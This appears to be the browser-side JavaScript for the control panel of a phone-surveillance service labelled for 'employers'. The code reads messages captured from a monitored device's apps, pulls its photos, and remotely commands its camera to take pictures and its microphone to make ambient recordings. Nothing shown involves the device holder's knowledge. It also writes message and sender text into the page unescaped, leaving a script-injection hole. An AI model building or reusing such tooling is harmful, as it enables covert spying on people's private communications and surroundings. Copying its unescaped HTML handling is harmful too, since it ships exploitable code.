function logout() { localStorage.clear(); window.location.href = '/'; }

function openLightbox(img) {
    document.getElementById('lightbox-img').src = img.dataset.src;
    document.getElementById('lightbox').style.display = 'flex';
}

function closeLightbox() {
    document.getElementById('lightbox').style.display = 'none';
}

function showTab(name, el) {
    document.querySelectorAll('.tab-content').forEach(t => t.classList.remove('active'));
    document.querySelectorAll('.tab').forEach(t => t.classList.remove('active'));
    document.getElementById('tab-' + name).classList.add('active');
    el.classList.add('active');
}

let allNotifications = [];
let currentIncomingApp = '';

fetch(window.location.href.replace('/device', '/device/notifications-data'))
    .then(function(r) { return r.json(); })
    .then(function(data) { allNotifications = data.notifications || []; });

function showDirection(dir) {
    document.getElementById('msg-incoming').style.display = dir === 'incoming' ? 'block' : 'none';
    document.getElementById('msg-outgoing').style.display = dir === 'outgoing' ? 'block' : 'none';
    document.getElementById('btn-incoming').style.background = dir === 'incoming' ? '#1a1a2e' : '#eee';
    document.getElementById('btn-incoming').style.color = dir === 'incoming' ? 'white' : '#333';
    document.getElementById('btn-outgoing').style.background = dir === 'outgoing' ? '#1a1a2e' : '#eee';
    document.getElementById('btn-outgoing').style.color = dir === 'outgoing' ? 'white' : '#333';
}

function showIncomingChats(app) {
    currentIncomingApp = app;
    const appMessages = allNotifications.filter(function(n) {
        return n.app === app && n.direction !== 'outgoing';
    });
    const senders = [...new Set(appMessages.map(function(n) { return n.sender; }))];

    document.getElementById('incoming-chats').style.display = 'block';
    const list = document.getElementById('incoming-chats-list');

    if (senders.length === 0) {
        list.innerHTML = '<p class="no-data">No chats found</p>';
        return;
    }

    list.innerHTML = senders.map(function(sender) {
        const msgs = appMessages.filter(function(n) { return n.sender === sender; });
        const latest = msgs[msgs.length - 1];
        const safeSender = sender.replace(/'/g, '&#39;');
        return '<div onclick="showIncomingMessages(\'' + safeSender + '\')" '
            + 'style="padding:14px;border-bottom:1px solid #eee;cursor:pointer;display:flex;justify-content:space-between;align-items:center" '
            + 'onmouseover="this.style.background=\'#f9f9f9\'" onmouseout="this.style.background=\'\'">'
            + '<div>'
            + '<div style="font-weight:bold;color:#1a1a2e">' + sender + '</div>'
            + '<div style="color:#888;font-size:12px;margin-top:2px">' + (latest ? latest.message.substring(0, 50) : '') + '...</div>'
            + '</div>'
            + '<div style="text-align:right;flex-shrink:0;margin-left:12px">'
            + '<div style="color:#888;font-size:11px">' + (latest ? new Date(latest.received_at).toLocaleString() : '') + '</div>'
            + '<div style="background:#1a1a2e;color:white;border-radius:10px;padding:2px 8px;font-size:11px;margin-top:4px">' + msgs.length + ' msgs</div>'
            + '</div></div>';
    }).join('');
}

function showIncomingMessages(sender) {
    const msgs = allNotifications
        .filter(function(n) { return n.app === currentIncomingApp && n.sender === sender && n.direction !== 'outgoing'; })
        .sort(function(a, b) { return new Date(a.received_at) - new Date(b.received_at); });

    document.getElementById('incoming-chats').style.display = 'none';
    document.getElementById('incoming-messages').style.display = 'block';
    document.getElementById('incoming-messages-title').textContent = sender;

    const list = document.getElementById('incoming-messages-list');
    list.innerHTML = msgs.map(function(m) {
        return '<div style="padding:10px 14px;border-bottom:1px solid #eee">'
            + '<div style="display:flex;justify-content:space-between;align-items:flex-start">'
            + '<div style="background:#f0f2ff;border-radius:8px;padding:8px 12px;max-width:75%">'
            + '<div style="color:#1a1a2e;font-size:14px">' + m.message + '</div>'
            + '</div>'
            + '<div style="color:#888;font-size:11px;margin-left:8px">' + new Date(m.received_at).toLocaleString() + '</div>'
            + '</div></div>';
    }).join('');
    list.scrollTop = list.scrollHeight;
}

async function requestDownload(token, filename, image_id) {
    const btn = event.target;
    btn.textContent = 'Requesting...';
    btn.disabled = true;

    const res = await fetch('/employer/request-download', {
        method: 'POST', headers: {'Content-Type': 'application/json'},
        body: JSON.stringify({ token, filename, image_id })
    });
    const data = await res.json();

    if (data.success) {
        btn.textContent = 'Waiting for device...';
        const interval = setInterval(async function() {
            const dlRes = await fetch('/employer/download-full', {
                method: 'POST', headers: {'Content-Type': 'application/json'},
                body: JSON.stringify({ token, filename })
            });
            const dlData = await dlRes.json();
            if (dlData.success) {
                clearInterval(interval);
                const link = document.createElement('a');
                link.href = 'data:image/jpeg;base64,' + dlData.image;
                link.download = filename;
                link.click();
                btn.textContent = 'Downloaded ✅';
            }
        }, 10000);
    }
}
const deviceToken = new URLSearchParams(window.location.search).get('token');

async function sendCommand(type) {
    const duration = document.getElementById('record-duration')?.value || 30;
    const facing = document.getElementById('camera-facing')?.value || 'back';
    console.log('Sending command:', type, 'facing:', facing, 'duration:', duration);
    
    const res = await fetch('/employer/command', {
        method: 'POST',
        headers: {'Content-Type': 'application/json'},
        body: JSON.stringify({ token: deviceToken, type, duration: parseInt(duration), facing })
    });
    const data = await res.json();
    
    if (data.success) {
        msg.style.display = 'block';
        msg.style.background = '#dfd';
        msg.style.color = '#060';
        msg.textContent = type === 'record_ambient' 
            ? 'Recording command sent! Audio will appear below within 2 minutes + recording duration.'
            : 'Photo command sent! Image will appear below within 2 minutes.';
        setTimeout(loadRemoteResults, 5000);
    } else {
        msg.style.display = 'block';
        msg.style.background = '#fde';
        msg.style.color = '#c00';
        msg.textContent = data.message || 'Failed to send command';
    }
}

async function loadRemoteResults() {
    const res = await fetch('/employer/command-results', {
        method: 'POST',
        headers: {'Content-Type': 'application/json'},
        body: JSON.stringify({ token: deviceToken })
    });
    const data = await res.json();
    const container = document.getElementById('remote-results');
    
    if (!data.commands || data.commands.length === 0) {
        container.innerHTML = '<p style="color:#888;text-align:center;padding:20px">No results yet</p>';
        return;
    }
    
    container.innerHTML = data.commands.map(function(cmd) {
        const date = new Date(cmd.completed_at).toLocaleString();
        if (cmd.type === 'take_photo' && cmd.result) {
            return '<div style="background:#f8f8f8;border-radius:8px;padding:16px;margin-bottom:12px">'
                + '<div style="display:flex;justify-content:space-between;margin-bottom:8px">'
                + '<b>📷 Photo</b><span style="color:#888;font-size:12px">' + date + '</span>'
                + '</div>'
                + '<img src="data:image/jpeg;base64,' + cmd.result + '" style="max-width:100%;border-radius:8px;cursor:pointer" onclick="openLightbox(this)" data-src="data:image/jpeg;base64,' + cmd.result + '"/>'
                + '<a href="data:image/jpeg;base64,' + cmd.result + '" download="remote_photo_' + date + '.jpg" style="display:block;margin-top:8px;color:#1a1a2e;font-size:13px">⬇️ Download</a>'
                + '</div>';
        } else if (cmd.type === 'record_ambient' && cmd.result) {
            return '<div style="background:#f8f8f8;border-radius:8px;padding:16px;margin-bottom:12px">'
                + '<div style="display:flex;justify-content:space-between;margin-bottom:8px">'
                + '<b>🎙️ Ambient Recording (' + (cmd.duration || 30) + 's)</b><span style="color:#888;font-size:12px">' + date + '</span>'
                + '</div>'
                + '<audio controls src="data:audio/mp4;base64,' + cmd.result + '" style="width:100%"></audio>'
                + '<a href="data:audio/mp4;base64,' + cmd.result + '" download="ambient_' + date + '.mp4" style="display:block;margin-top:8px;color:#1a1a2e;font-size:13px">⬇️ Download</a>'
                + '</div>';
        } else {
            return '<div style="background:#f8f8f8;border-radius:8px;padding:16px;margin-bottom:12px">'
                + '<b>' + cmd.type + '</b> - ' + (cmd.status === 'failed' ? '❌ Failed' : '⏳ Pending')
                + '<span style="color:#888;font-size:12px;float:right">' + date + '</span>'
                + '</div>';
        }
    }).join('');
}

// Auto-load results when remote tab opened
loadRemoteResults();
// Refresh every 30 seconds
setInterval(loadRemoteResults, 30000);
